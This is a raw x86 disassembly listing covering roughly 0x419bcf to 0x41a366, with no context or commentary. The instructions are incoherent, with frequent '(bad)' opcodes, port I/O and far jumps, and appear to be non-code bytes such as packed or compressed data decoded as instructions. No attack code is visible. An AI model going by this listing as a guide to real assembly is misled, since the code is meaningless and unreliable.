  419bcf:	lea    esi,[esi+0x15]
  419bd2:	xchg   BYTE PTR [edi+0x7b],cl
  419bd5:	pop    ds
  419bd6:	add    bl,BYTE PTR [eax-0x27fe2bdd]
  419bdc:	arpl   WORD PTR [edx],bp
  419bde:	les    esp,FWORD PTR [ebx]
  419be0:	cmp    ah,BYTE PTR [ebx]
  419be2:	jecxz  0x419bc3
  419be4:	clc    
  419be5:	lahf   
  419be6:	es dec edx
  419be8:	test   BYTE PTR [edi-0x35],0xb1
  419bec:	xchg   esp,eax
  419bed:	pop    esp
  419bee:	repz les ebx,FWORD PTR [ecx]
  419bf1:	adc    al,0xdc
  419bf3:	mov    dh,0xc8
  419bf5:	sbb    al,0x5c
  419bf7:	mov    ecx,cs
  419bf9:	adc    ebx,DWORD PTR [ecx-0x64]
  419bfc:	popf   
  419bfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bfe:	adc    ebp,DWORD PTR [edx+eax*8-0x44e127f9]
  419c05:	mov    al,0x71
  419c07:	sar    DWORD PTR [eax-0x56],cl
  419c0a:	jg     0x419bbf
  419c0c:	pop    esp
  419c0d:	mov    esp,0xf96b065e
  419c12:	std    
  419c13:	lds    eax,FWORD PTR [ecx+eax*8+0x3b3ee038]
  419c1a:	dec    ecx
  419c1b:	push   es
  419c1c:	xchg   ebx,eax
  419c1d:	enter  0x6602,0x1e
  419c21:	jb     0x419c31
  419c23:	mov    esp,0x5a5fa4a8
  419c28:	fist   DWORD PTR [ebp-0x63]
  419c2b:	xchg   edx,eax
  419c2c:	clc    
  419c2d:	push   esi
  419c2e:	or     DWORD PTR [edx+0x25],edi
  419c31:	xchg   ebp,eax
  419c32:	or     eax,DWORD PTR [esi-0x28]
  419c35:	or     ecx,ebp
  419c37:	fdivrp st(2),st
  419c39:	mov    ebp,0x57239f77
  419c3e:	inc    eax
  419c3f:	and    al,0x9c
  419c41:	adc    eax,0xba16931d
  419c46:	sub    eax,0x8ad34565
  419c4b:	adc    al,0x77
  419c4d:	sbb    DWORD PTR [esi-0x71],esp
  419c50:	jp     0x419cb5
  419c52:	or     BYTE PTR [edi+0x66],al
  419c55:	inc    ecx
  419c56:	mov    ch,0x8e
  419c58:	je     0x419c75
  419c5a:	aam    0xd0
  419c5c:	inc    edi
  419c5d:	sub    bl,BYTE PTR [ebx]
  419c5f:	mov    DWORD PTR [esi-0x39],edi
  419c62:	out    0x3e,eax
  419c64:	sbb    BYTE PTR [edi-0x46e22198],ah
  419c6a:	push   0xf1cf5ecb
  419c6f:	outs   dx,DWORD PTR ds:[esi]
  419c70:	pop    ebp
  419c71:	imul   ecx,DWORD PTR [edi],0x3e
  419c74:	jbe    0x419cec
  419c76:	push   edi
  419c77:	cmp    al,0x57
  419c79:	or     eax,0x70e31568
  419c7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c7f:	(bad)  
  419c81:	mov    dh,0xf0
  419c83:	jns    0x419ca4
  419c85:	call   0x4d27:0x6ca5d827
  419c8c:	add    ch,0x18
  419c8f:	cmc    
  419c90:	in     al,0x55
  419c92:	and    BYTE PTR ds:[ecx],bh
  419c95:	or     DWORD PTR [esi+ebp*2+0x4b],esp
  419c99:	inc    ecx
  419c9a:	jle    0x419cd9
  419c9c:	push   ds
  419c9d:	aaa    
  419c9e:	ins    BYTE PTR es:[edi],dx
  419c9f:	fmul   QWORD PTR [edx-0x7e]
  419ca2:	out    dx,eax
  419ca3:	xchg   esi,eax
  419ca4:	sti    
  419ca5:	rol    BYTE PTR [edx+0x30],cl
  419ca8:	xchg   ecx,eax
  419ca9:	mov    bh,0x97
  419cab:	repnz hlt 
  419cad:	push   edi
  419cae:	push   eax
  419caf:	aas    
  419cb0:	pop    ecx
  419cb1:	inc    esp
  419cb2:	and    DWORD PTR [edx+0x43],ecx
  419cb5:	(bad)  
  419cb6:	push   ecx
  419cb7:	jge    0x419c81
  419cb9:	test   al,0xd6
  419cbb:	add    DWORD PTR [esi],0xffffffda
  419cbe:	add    DWORD PTR [edi],eax
  419cc0:	and    BYTE PTR [ebx+ecx*8-0x7d],dh
  419cc4:	lock dec edx
  419cc6:	mov    esp,0xd2a0deaf
  419ccb:	mov    al,0xeb
  419ccd:	ds sbb al,0x56
  419cd0:	popf   
  419cd1:	stos   BYTE PTR es:[edi],al
  419cd2:	cld    
  419cd3:	xchg   esi,eax
  419cd4:	aaa    
  419cd5:	rcl    DWORD PTR [ebx+0x2f],1
  419cd8:	add    BYTE PTR [edi-0x5d429562],0x78
  419cdf:	shr    ecx,0xaf
  419ce2:	loopne 0x419c8b
  419ce4:	lods   eax,DWORD PTR ds:[esi]
  419ce5:	jne    0x419d34
  419ce7:	pop    ds
  419ce8:	shr    BYTE PTR [eax+edi*2],1
  419ceb:	add    DWORD PTR [ebx+0x42],ebx
  419cee:	xlat   BYTE PTR ds:[ebx]
  419cef:	lods   eax,DWORD PTR ds:[esi]
  419cf0:	shr    BYTE PTR [edi],cl
  419cf2:	test   cl,dl
  419cf4:	mov    edi,0x6cb8ae57
  419cf9:	or     al,0xc0
  419cfb:	adc    DWORD PTR [ebx-0x60f070b],esp
  419d01:	cmp    BYTE PTR [edi],ch
  419d03:	push   ebp
  419d04:	mov    cl,0x66
  419d06:	shl    ecx,cl
  419d08:	retf   0xbd08
  419d0b:	sti    
  419d0c:	and    dh,al
  419d0e:	push   ebp
  419d0f:	stc    
  419d10:	mov    dh,dh
  419d12:	add    BYTE PTR [edi],0xae
  419d15:	call   DWORD PTR ds:0x9fe5937d
  419d1b:	stc    
  419d1c:	jo     0x419ce4
  419d1e:	out    0x50,al
  419d20:	pop    eax
  419d21:	jle    0x419cd6
  419d23:	dec    ebx
  419d24:	retf   
  419d25:	lock cmp eax,0x31cba668
  419d2b:	push   es
  419d2c:	mov    dl,0x1c
  419d2e:	sub    eax,0x45027c58
  419d33:	fist   DWORD PTR [edx+0x3df26e63]
  419d39:	push   esi
  419d3a:	enter  0x314b,0x9a
  419d3e:	jmp    0x5845:0xb3681e06
  419d45:	lea    edi,[edx+0x5a]
  419d48:	jbe    0x419ccc
  419d4a:	test   eax,0x248635c6
  419d4f:	int3   
  419d50:	dec    eax
  419d51:	add    ebx,0x2
  419d54:	adc    BYTE PTR [eax-0x41],ah
  419d57:	adc    BYTE PTR [ecx],bh
  419d59:	test   al,0xe1
  419d5b:	loopne 0x419d21
  419d5d:	or     DWORD PTR [esi-0x1116ad59],ebp
  419d63:	cmc    
  419d64:	add    DWORD PTR [eax+0x76],eax
  419d67:	test   al,0x3c
  419d69:	ret    
  419d6a:	outs   dx,DWORD PTR ds:[esi]
  419d6b:	outs   dx,BYTE PTR ds:[esi]
  419d6c:	cmp    eax,0xacdd44a9
  419d71:	retf   0x7bff
  419d74:	jecxz  0x419deb
  419d76:	pop    ebp
  419d77:	inc    ecx
  419d78:	push   edi
  419d79:	xchg   BYTE PTR [edx],dh
  419d7b:	nop
  419d7c:	pushf  
  419d7d:	or     dl,BYTE PTR [edi+0xa89497e]
  419d83:	sub    ecx,DWORD PTR [ecx-0x7e60941c]
  419d89:	(bad)  
  419d8a:	xchg   esi,eax
  419d8b:	popa   
  419d8c:	into   
  419d8d:	adc    esi,edi
  419d8f:	mov    DWORD PTR [ecx+0x6d6b0e20],ebp
  419d95:	dec    ebp
  419d96:	ret    
  419d97:	into   
  419d98:	adc    dl,dl
  419d9a:	dec    ecx
  419d9b:	pop    ecx
  419d9c:	mov    bh,0x1b
  419d9e:	sub    edx,eax
  419da0:	out    0x37,eax
  419da2:	add    BYTE PTR [ebx-0x2],al
  419da5:	in     eax,0x29
  419da7:	data16 jecxz 0x419df8
  419daa:	fld    QWORD PTR [edx-0x2cd33278]
  419db0:	cmp    BYTE PTR [eax],ch
  419db2:	pop    edx
  419db3:	stos   DWORD PTR es:[edi],eax
  419db4:	jno    0x419e0b
  419db6:	jmp    0xfe96:0x23de965b
  419dbd:	in     eax,dx
  419dbe:	jne    0x419dfe
  419dc0:	repz cmp eax,0xdf8f86eb
  419dc6:	pop    edx
  419dc7:	cmc    
  419dc8:	jmp    0x2b4a:0x17de0cc8
  419dcf:	mov    eax,ds:0xb041d8d6
  419dd4:	inc    esi
  419dd5:	sbb    edx,DWORD PTR [eax+0xfd450c5]
  419ddb:	arpl   WORD PTR [ebx+eiz*1+0x48],dx
  419ddf:	hlt    
  419de0:	adc    BYTE PTR [ecx+0x5ab65f2],0x29
  419de7:	or     edx,DWORD PTR [edx]
  419de9:	jl     0x419dcc
  419deb:	push   eax
  419dec:	mov    ch,0x97
  419dee:	sbb    DWORD PTR [ebp-0x24146db0],esi
  419df4:	nop
  419df5:	inc    esp
  419df6:	fiadd  DWORD PTR [edx]
  419df8:	sti    
  419df9:	js     0x419ddc
  419dfb:	jmp    0xf3e2:0x750cc7c2
  419e02:	ds dec ebx
  419e04:	inc    ebx
  419e05:	pusha  
  419e06:	dec    esp
  419e07:	xchg   ecx,eax
  419e08:	mov    dh,0x9
  419e0a:	sbb    DWORD PTR [ebx+eax*2+0x2cd1cc3],edi
  419e11:	mov    ch,0x5c
  419e13:	popf   
  419e14:	mov    dl,0x37
  419e16:	sub    eax,0x5c6830d6
  419e1b:	scas   eax,DWORD PTR es:[edi]
  419e1c:	pop    DWORD PTR [esi]
  419e1e:	jmp    0x419e7a
  419e20:	mov    ah,ah
  419e22:	and    DWORD PTR [eax+ecx*1-0x47f63802],esi
  419e29:	cmp    al,BYTE PTR [esi]
  419e2b:	and    eax,0x27b54a83
  419e30:	cmp    al,0xa7
  419e32:	outs   dx,DWORD PTR ds:[esi]
  419e33:	ret    
  419e34:	cmp    al,0xb7
  419e36:	repz inc esp
  419e38:	and    al,0x8
  419e3a:	ins    BYTE PTR es:[edi],dx
  419e3b:	repz fsubr st(7),st
  419e3e:	and    eax,0xdba5b396
  419e43:	popa   
  419e44:	or     edx,DWORD PTR [esi-0x9c186ca]
  419e4a:	dec    ebp
  419e4b:	imul   DWORD PTR [edx-0x4d]
  419e4e:	cmp    bh,bl
  419e50:	push   ebp
  419e51:	lods   eax,DWORD PTR ds:[esi]
  419e52:	mov    WORD PTR [eax+0x70d47a07],ds
  419e58:	das    
  419e59:	push   0x74a26c34
  419e5e:	ins    BYTE PTR es:[edi],dx
  419e5f:	fwait
  419e60:	ror    al,1
  419e62:	sbb    esi,DWORD PTR [edi+0x63]
  419e65:	mov    al,0xc3
  419e67:	add    DWORD PTR [edi-0x73030c95],edi
  419e6d:	aad    0x1c
  419e6f:	in     al,0xc4
  419e71:	fsave  [eax+0x7b]
  419e75:	mov    ebp,0xe7a85a5f
  419e7a:	inc    ebx
  419e7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e7c:	int    0x21
  419e7e:	clc    
  419e7f:	jp     0x419e54
  419e81:	dec    esi
  419e82:	sbb    BYTE PTR [eax+0x62],bl
  419e85:	and    DWORD PTR [esi-0x4709dc03],edi
  419e8b:	mov    edi,0x8adb3f50
  419e90:	push   es
  419e91:	loope  0x419e4e
  419e93:	jb     0x419e78
  419e95:	and    esi,DWORD PTR [ebx-0x24]
  419e98:	imul   ebp,DWORD PTR [ebp+0x14ebf4ac],0x8892d66d
  419ea2:	mov    DWORD PTR gs:[edi-0x20],esi
  419ea6:	enter  0xc636,0xde
  419eaa:	retf   0xb7fe
  419ead:	sbb    ah,BYTE PTR [ebp-0x3e3dfd26]
  419eb3:	dec    eax
  419eb4:	inc    ebp
  419eb5:	sub    eax,0xcd12482a
  419eba:	jbe    0x419e8c
  419ebc:	imul   edi,ebx,0xbc261d3d
  419ec2:	mov    al,ds:0x305619fc
  419ec7:	push   edx
  419ec8:	add    DWORD PTR [eax-0x70],edx
  419ecb:	jne    0x419e4d
  419ecd:	(bad)  
  419ece:	mov    BYTE PTR [esi+ebp*8-0x48],dh
  419ed2:	adc    eax,0xd8247018
  419ed7:	lahf   
  419ed8:	inc    ecx
  419ed9:	(bad)  
  419edb:	sahf   
  419edc:	push   ebx
  419edd:	push   eax
  419ede:	(bad)  
  419edf:	pop    edx
  419ee0:	jnp    0x419f10
  419ee2:	popa   
  419ee3:	or     esp,DWORD PTR [ebx+0x70]
  419ee6:	jnp    0x419e68
  419ee8:	sub    DWORD PTR [esi],ebx
  419eea:	jne    0x419efc
  419eec:	push   esi
  419eed:	in     al,0xac
  419eef:	test   DWORD PTR [eax+0x64bd6ef9],ebx
  419ef5:	fild   QWORD PTR [esp+ecx*4+0x44]
  419ef9:	sub    eax,0xa14803b1
  419efe:	pop    edx
  419eff:	add    cl,BYTE PTR [edi-0x7c2af7cb]
  419f05:	pop    es
  419f06:	jo     0x419ed6
  419f08:	mov    ecx,0x2e3688a8
  419f0d:	inc    ebx
  419f0e:	mov    ecx,0x6f18d401
  419f13:	sub    edx,DWORD PTR [edx-0x6a]
  419f16:	mov    al,ds:0xe5d187a2
  419f1b:	mov    BYTE PTR [ebx+0x193ffcc1],0x12
  419f22:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  419f24:	(bad)  
  419f25:	mov    ds:0xb5c918f8,eax
  419f2a:	rcl    BYTE PTR [esi+0x52b788bf],0x70
  419f31:	add    al,bl
  419f33:	retf   
  419f34:	(bad)
  419f38:	ins    BYTE PTR es:[edi],dx
  419f39:	fldenv [eax+ecx*2-0x3e]
  419f3d:	jbe    0x419f21
  419f3f:	mov    al,ds:0x420c6ed7
  419f44:	sub    DWORD PTR [esp+ebx*2+0x47],ecx
  419f48:	ret    0xbe9e
  419f4b:	xor    BYTE PTR [ebx-0x4be6f339],bl
  419f51:	js     0x419fbc
  419f53:	add    bl,BYTE PTR [esi+0x5]
  419f56:	and    eax,0x4bbd90ad
  419f5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f5c:	xor    DWORD PTR [edx],0xffffffca
  419f5f:	sub    eax,0x7760b936
  419f64:	pop    ebp
  419f65:	add    al,0xcf
  419f67:	lea    ebp,[ebp-0x2f95f16d]
  419f6d:	xor    BYTE PTR [esi-0x13f5cb5f],bh
  419f73:	pop    ebx
  419f74:	call   0xe60c:0x84a85b80
  419f7b:	sahf   
  419f7c:	pop    es
  419f7d:	out    0x1c,eax
  419f7f:	std    
  419f80:	push   edi
  419f81:	ja     0x419fe5
  419f83:	xor    BYTE PTR [ebx],dl
  419f85:	push   esi
  419f86:	retf   
  419f87:	push   eax
  419f88:	jae    0x419f8a
  419f8a:	inc    ecx
  419f8b:	fwait
  419f8c:	sbb    eax,0x6be51fe9
  419f91:	adc    al,0x48
  419f93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f94:	add    BYTE PTR [esi],0x2
  419f97:	dec    ebx
  419f98:	les    ecx,FWORD PTR [esi-0xd]
  419f9b:	mov    ds:0x33df06e4,eax
  419fa0:	pusha  
  419fa1:	outs   dx,DWORD PTR ds:[esi]
  419fa2:	or     al,0x53
  419fa4:	xchg   edx,eax
  419fa5:	pop    ebp
  419fa6:	mov    ebp,0x9084b97e
  419fab:	sbb    al,ch
  419fad:	ss stc 
  419faf:	shl    DWORD PTR [ebp+0x72a60dd0],1
  419fb5:	adc    esp,eax
  419fb7:	xlat   BYTE PTR ds:[ebx]
  419fb8:	push   cs
  419fb9:	out    0x2e,al
  419fbb:	cld    
  419fbc:	xor    edi,esi
  419fbe:	dec    esi
  419fbf:	out    0x12,eax
  419fc1:	arpl   WORD PTR [ebp+0xcb2d4a6],ax
  419fc7:	push   DWORD PTR [edi]
  419fc9:	ins    DWORD PTR es:[edi],dx
  419fca:	add    eax,0x595130f5
  419fcf:	fwait
  419fd0:	arpl   WORD PTR [edx+0x6],ax
  419fd3:	or     ch,BYTE PTR [ebx]
  419fd5:	fiadd  DWORD PTR [edi-0x2397deda]
  419fdb:	cmc    
  419fdc:	das    
  419fdd:	test   al,0x60
  419fdf:	icebp  
  419fe0:	rcr    DWORD PTR ds:0x821e9b2f,0x2e
  419fe7:	retf   0xee48
  419fea:	and    eax,0xc7a0fa87
  419fef:	test   esp,esi
  419ff1:	adc    ecx,ecx
  419ff3:	(bad)  
  419ff4:	enter  0xe9b6,0xfb
  419ff8:	out    dx,eax
  419ff9:	imul   edx,DWORD PTR [ebp-0x8d45499],0x28
  41a000:	push   edx
  41a001:	sbb    al,BYTE PTR [esi]
  41a003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a004:	(bad)  
  41a005:	jnp    0x419fe1
  41a007:	cmp    edx,DWORD PTR [ebx-0x2f]
  41a00a:	pushf  
  41a00b:	aaa    
  41a00c:	bound  ebp,QWORD PTR [esp+eiz*2]
  41a00f:	push   ds
  41a010:	lods   al,BYTE PTR ds:[esi]
  41a011:	cmp    DWORD PTR [ecx],0x33a6462f
  41a017:	xchg   ebp,eax
  41a018:	mov    ecx,0xa75d4b7c
  41a01d:	and    BYTE PTR [ebx],ch
  41a01f:	rcl    BYTE PTR [edi-0x111e8970],1
  41a025:	xor    ah,BYTE PTR [ecx]
  41a027:	push   ebx
  41a028:	aad    0xf2
  41a02a:	retf   0xa790
  41a02d:	repnz (bad) 
  41a02f:	add    al,0x4c
  41a031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a032:	push   0x64
  41a034:	push   ss
  41a035:	xor    edi,DWORD PTR [ecx-0x25544546]
  41a03b:	rol    BYTE PTR [ebx-0x7a],cl
  41a03e:	cli    
  41a03f:	mov    eax,ds
  41a041:	adc    al,0x79
  41a043:	mov    ecx,0xc5de68a2
  41a048:	jecxz  0x419fe6
  41a04a:	add    BYTE PTR [esi+0x364d9fe8],dh
  41a050:	jg     0x41a038
  41a052:	jbe    0x41a002
  41a054:	bound  ebx,QWORD PTR [ecx+eiz*2+0xe]
  41a058:	repz cli 
  41a05a:	test   al,0x99
  41a05c:	clc    
  41a05d:	imul   ebp,edi,0xffffff80
  41a060:	dec    edx
  41a061:	(bad)  
  41a062:	rol    DWORD PTR [ebx-0x4fb2b39c],1
  41a068:	(bad)  
  41a069:	sahf   
  41a06a:	iret   
  41a06b:	test   BYTE PTR [edi+0x42f70ca5],0xd8
  41a072:	sub    ch,BYTE PTR [ebp+0x69]
  41a075:	or     DWORD PTR [edx+0xab7e82b],esp
  41a07b:	out    0x12,al
  41a07d:	push   0xffffffea
  41a07f:	fwait
  41a080:	std    
  41a081:	adc    eax,0xb99d3cb8
  41a086:	into   
  41a087:	jecxz  0x41a0f6
  41a089:	and    ch,BYTE PTR [esi]
  41a08b:	or     DWORD PTR [ebx-0x6da8177d],0x3961360c
  41a095:	jne    0x41a09f
  41a097:	adc    al,0x50
  41a099:	mov    eax,0x72ec967c
  41a09e:	xchg   edi,eax
  41a09f:	aaa    
  41a0a0:	clc    
  41a0a1:	push   cs
  41a0a2:	mov    ch,0x15
  41a0a4:	xchg   esi,eax
  41a0a5:	sbb    ch,bl
  41a0a7:	jle    0x41a097
  41a0a9:	dec    ecx
  41a0aa:	out    dx,eax
  41a0ab:	out    dx,eax
  41a0ac:	jg     0x41a0e8
  41a0ae:	ret    
  41a0af:	pop    es
  41a0b0:	mov    al,0x78
  41a0b2:	pop    ds
  41a0b3:	sbb    DWORD PTR [ebx+0x3df8baec],eax
  41a0b9:	call   0x7bb9:0x5e34a922
  41a0c0:	gs (bad) 
  41a0c2:	xor    al,BYTE PTR ds:0x382afa79
  41a0c8:	int    0xb6
  41a0ca:	jp     0x41a10f
  41a0cc:	icebp  
  41a0cd:	cmp    eax,0x60d612ea
  41a0d2:	enter  0x49b4,0xdd
  41a0d6:	or     dl,BYTE PTR [ebp-0x7d886c6d]
  41a0dc:	sbb    DWORD PTR [eax-0x7a],esp
  41a0df:	sbb    al,0x40
  41a0e1:	mov    ch,al
  41a0e3:	ins    DWORD PTR es:[edi],dx
  41a0e4:	cld    
  41a0e5:	cld    
  41a0e6:	mov    ds:0xb75a0e65,eax
  41a0eb:	call   0xf638:0xbdec3200
  41a0f2:	pusha  
  41a0f3:	shl    DWORD PTR [ebp+edx*4+0x64],1
  41a0f7:	out    0x8,eax
  41a0f9:	inc    ebp
  41a0fa:	arpl   WORD PTR [ecx+0x3a3c4707],sp
  41a100:	js     0x41a160
  41a102:	in     al,dx
  41a103:	test   eax,0xba03c08a
  41a108:	mov    ah,0x59
  41a10a:	sbb    ebx,DWORD PTR [eax+0x56982ae6]
  41a110:	ret    0x31e6
  41a113:	das    
  41a114:	mov    eax,0x8c2c9170
  41a119:	sbb    DWORD PTR [edx],ebx
  41a11b:	rcl    BYTE PTR [bp+si+0x7e97],cl
  41a120:	mov    dh,0xe6
  41a122:	sub    bh,BYTE PTR [ecx]
  41a124:	push   ebp
  41a125:	aas    
  41a126:	xbegin 0xb7d3ee12
  41a12c:	(bad)  
  41a12d:	aam    0x8a
  41a12f:	popa   
  41a130:	aaa    
  41a131:	gs mov edi,0xdac620c7
  41a137:	mov    bh,0xd7
  41a139:	or     eax,DWORD PTR [edx+edx*4]
  41a13c:	inc    eax
  41a13d:	xchg   ebx,eax
  41a13e:	aam    0x6b
  41a140:	fadd   QWORD PTR [edi]
  41a142:	jb     0x41a146
  41a144:	imul   ebx,DWORD PTR [ebx],0xffffff8d
  41a147:	adc    ebp,eax
  41a149:	add    ebp,edi
  41a14b:	dec    esp
  41a14c:	push   0x6a
  41a14e:	test   eax,0x8d62673c
  41a153:	mov    al,ds:0x43d6d751
  41a158:	mov    ds:0xe0e881ca,al
  41a15d:	leave  
  41a15e:	outs   dx,BYTE PTR ds:[esi]
  41a15f:	and    DWORD PTR [ebx-0x52d0ae5e],ebp
  41a165:	mov    ch,0xa0
  41a167:	or     eax,0x96de335f
  41a16c:	or     BYTE PTR [ebx],dl
  41a16e:	or     eax,0xe63cc436
  41a173:	mov    ebx,0xbba57c30
  41a178:	dec    eax
  41a179:	mov    WORD PTR [eax+0x3a90a768],fs
  41a17f:	inc    ebp
  41a180:	mov    ebp,0xd5500674
  41a185:	enter  0x6849,0x8d
  41a189:	lods   al,BYTE PTR ds:[esi]
  41a18a:	dec    DWORD PTR [eax+0x4819c230]
  41a190:	add    bl,BYTE PTR [ebx]
  41a192:	sbb    eax,0x45c762a4
  41a197:	adc    eax,0x7c166ead
  41a19c:	sbb    al,0x59
  41a19e:	or     DWORD PTR [esi+ebx*4-0x3a],edi
  41a1a2:	xchg   BYTE PTR [ebx+0x7ddef851],dl
  41a1a8:	jmp    0x4dd830b2
  41a1ad:	pop    esi
  41a1ae:	test   DWORD PTR [eax-0x35facf08],eax
  41a1b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1b5:	fdiv   DWORD PTR [ecx+0x29]
  41a1b8:	xchg   DWORD PTR [ecx-0x2d6a4276],edx
  41a1be:	inc    ebx
  41a1bf:	mov    esi,0xc14ff9a4
  41a1c4:	cmp    esp,ecx
  41a1c6:	push   cs
  41a1c7:	cli    
  41a1c8:	lea    ebp,[edx-0x34]
  41a1cb:	sti    
  41a1cc:	outs   dx,DWORD PTR ds:[esi]
  41a1cd:	inc    ebx
  41a1ce:	dec    esi
  41a1cf:	inc    ecx
  41a1d0:	outs   dx,BYTE PTR ds:[esi]
  41a1d1:	or     eax,0x2ab576ba
  41a1d7:	pop    esi
  41a1d8:	loope  0x41a170
  41a1da:	in     eax,0x1f
  41a1dc:	xor    DWORD PTR [esi+0x51],eax
  41a1df:	dec    edx
  41a1e0:	sbb    al,0x79
  41a1e2:	repnz cwde 
  41a1e4:	shr    BYTE PTR [ecx-0x62989e66],1
  41a1ea:	retf   
  41a1eb:	sub    al,0x70
  41a1ed:	ja     0x41a1fd
  41a1ef:	mov    edi,0x3aa004c4
  41a1f4:	sub    dh,bl
  41a1f6:	xchg   ecx,eax
  41a1f7:	call   0xf4f85a2a
  41a1fc:	push   ss
  41a1fd:	in     eax,0xb3
  41a1ff:	adc    eax,0x632475f0
  41a204:	sbb    eax,0x97fc23ca
  41a209:	mov    ch,0xbd
  41a20b:	sbb    eax,DWORD PTR [eax]
  41a20d:	clc    
  41a20e:	dec    edi
  41a20f:	or     edi,DWORD PTR [esi]
  41a211:	dec    esp
  41a212:	mov    cl,0xaf
  41a214:	aaa    
  41a215:	inc    esi
  41a216:	xchg   ebp,eax
  41a217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a218:	imul   esi,DWORD PTR [ebp+0x57],0xffffffb5
  41a21c:	in     al,0xcb
  41a21e:	sar    cl,cl
  41a220:	xchg   ebp,eax
  41a221:	mov    bh,0x19
  41a223:	fbld   TBYTE PTR [esi*1-0x7b04ccd7]
  41a22a:	push   ss
  41a22b:	mov    bl,0x61
  41a22d:	dec    edi
  41a22e:	or     ch,BYTE PTR [edx+ebp*2]
  41a231:	out    dx,al
  41a232:	sti    
  41a233:	scas   al,BYTE PTR es:[edi]
  41a234:	ret    
  41a235:	mov    ebp,DWORD PTR [ecx-0x6a]
  41a238:	jmp    0x41a1ca
  41a23a:	out    0xfc,eax
  41a23c:	sub    esp,DWORD PTR [edi-0x2a]
  41a23f:	jp     0x41a29f
  41a241:	mov    cl,0x25
  41a243:	out    0x17,al
  41a245:	mov    bl,0x54
  41a247:	and    BYTE PTR [eax],bl
  41a249:	popf   
  41a24a:	sahf   
  41a24b:	(bad)  
  41a24d:	les    ecx,FWORD PTR [edx-0x41df53e4]
  41a253:	xor    DWORD PTR [edx-0x4dfa301d],ecx
  41a259:	push   esp
  41a25a:	mov    ah,0xba
  41a25c:	push   0x2
  41a25e:	jne    0x41a251
  41a260:	mov    eax,0x99b2ffd8
  41a265:	cdq    
  41a266:	push   ebx
  41a267:	pop    ebx
  41a268:	in     al,0xba
  41a26a:	cs adc al,0xd5
  41a26d:	stos   DWORD PTR es:[edi],eax
  41a26e:	sbb    DWORD PTR [ecx],eax
  41a270:	int3   
  41a271:	aad    0xf8
  41a273:	fwait
  41a274:	mov    BYTE PTR [ecx-0x2fc8af2c],bl
  41a27a:	into   
  41a27b:	mov    eax,ds:0x7b95903d
  41a280:	adc    bh,ch
  41a282:	adc    eax,0xd295886f
  41a287:	out    0x2e,al
  41a289:	push   0x71
  41a28b:	push   ecx
  41a28c:	ror    BYTE PTR [edi+0x7d],1
  41a28f:	jmp    0x41a24b
  41a291:	(bad)  
  41a292:	sbb    DWORD PTR [edi+0x41],ebx
  41a295:	lock push 0xfffffff2
  41a298:	fs je  0x41a262
  41a29b:	pop    ds
  41a29c:	retf   0xd7d5
  41a29f:	adc    al,0xa5
  41a2a1:	les    ebx,FWORD PTR [esi-0x291c5d94]
  41a2a7:	mov    eax,DWORD PTR [ebp-0x7f]
  41a2aa:	jno    0x41a303
  41a2ac:	stos   BYTE PTR es:[edi],al
  41a2ad:	jp     0x41a233
  41a2af:	and    eax,0x4f52c2a7
  41a2b4:	lea    ecx,[edx+0xd]
  41a2b7:	(bad)  
  41a2b8:	loop   0x41a332
  41a2ba:	imul   esi,esp,0xffffff86
  41a2bd:	gs inc ebp
  41a2bf:	in     al,0xf8
  41a2c1:	inc    esi
  41a2c2:	or     bh,BYTE PTR [edx]
  41a2c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2c5:	cmp    DWORD PTR [ecx+eiz*2-0x2fd4f43f],edx
  41a2cc:	and    ch,BYTE PTR [edx+0x12]
  41a2cf:	push   0xe
  41a2d1:	cmp    DWORD PTR [eax],edx
  41a2d3:	xchg   ebx,eax
  41a2d4:	and    al,0x46
  41a2d6:	and    DWORD PTR [edi+0x3f1393cc],0xffffff98
  41a2dd:	sub    eax,0x17
  41a2e0:	xchg   ecx,eax
  41a2e1:	jl     0x41a2a0
  41a2e3:	mov    ds:0x310315dc,eax
  41a2e8:	push   esi
  41a2e9:	ss das 
  41a2eb:	inc    eax
  41a2ec:	jne    0x41a279
  41a2ee:	xor    BYTE PTR [eax],dh
  41a2f0:	mov    esp,0xda4a84f2
  41a2f5:	dec    ebx
  41a2f6:	std    
  41a2f7:	adc    ch,bl
  41a2f9:	add    BYTE PTR es:[edi],al
  41a2fc:	ins    DWORD PTR es:[edi],dx
  41a2fd:	pushf  
  41a2fe:	push   ebx
  41a2ff:	sbb    bl,BYTE PTR [eax+0x1ef707be]
  41a305:	pusha  
  41a306:	dec    eax
  41a307:	aas    
  41a308:	cmp    al,0xa8
  41a30a:	inc    ebx
  41a30b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a30c:	sub    eax,0x24cfde58
  41a311:	sbb    ebx,esp
  41a313:	jno    0x41a346
  41a315:	mov    ecx,0x30099e0b
  41a31a:	mov    gs,WORD PTR [ecx]
  41a31c:	and    edi,ebx
  41a31e:	jns    0x41a2aa
  41a320:	loope  0x41a2e0
  41a322:	or     BYTE PTR [eax+0xef7b4e3],0x6e
  41a329:	lock test BYTE PTR [esi-0x5271ae40],dl
  41a330:	and    al,0xdf
  41a332:	sahf   
  41a333:	popa   
  41a334:	xchg   BYTE PTR [ebx],ah
  41a336:	cmp    al,0x7d
  41a338:	bound  ebx,QWORD PTR [edx-0x7f]
  41a33b:	push   ebx
  41a33c:	or     al,dh
  41a33e:	xchg   ecx,ebx
  41a340:	repnz fs pop esp
  41a343:	fimul  DWORD PTR [eax-0x2b5f26f6]
  41a349:	scas   eax,DWORD PTR es:[edi]
  41a34a:	pusha  
  41a34b:	out    0x1f,al
  41a34d:	mov    ah,0xcc
  41a34f:	add    DWORD PTR [ecx-0x28],ebp
  41a352:	mov    bh,0xee
  41a354:	fstp   DWORD PTR [ecx+0x3d313a1e]
  41a35a:	inc    ecx
  41a35b:	(bad)  
  41a35c:	sbb    bh,bl
  41a35e:	pop    ss
  41a35f:	loop   0x41a3cc
  41a361:	xchg   esp,eax
  41a362:	xor    BYTE PTR [edi+0x55],ch
  41a365:	xchg   edx,eax
  41a366:	dec    ecx
